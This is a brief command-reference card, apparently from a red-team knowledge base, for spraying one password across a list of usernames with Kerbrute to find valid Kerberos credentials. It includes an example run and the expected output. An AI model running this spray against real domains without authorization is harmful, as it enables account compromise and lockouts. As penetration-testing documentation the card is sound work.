---
type: command
executor: bash
data: ./kerbrute passwordspray -d $_DOMAIN $_USERS_FILE $_PASSWORD
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - credential-access
  - kerberos
verified: true
validated: true
---

# kerbrute-password-spray

## Command

```bash
./kerbrute passwordspray -d $_DOMAIN $_USERS_FILE $_PASSWORD
```

## Description

Performs Kerberos password spraying against a user list to identify valid credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain | Yes |
| $_USERS_FILE | Path to usernames file | Yes |
| $_PASSWORD | Single password to spray | Yes |

## Examples

### Basic Usage

```bash
./kerbrute passwordspray -d example.com users.txt Winter2023
```

## Expected Output

"[+] VALID USERNAME: user@example.com" for successful logins.

## Related

- [[tools/Kerbrute]]
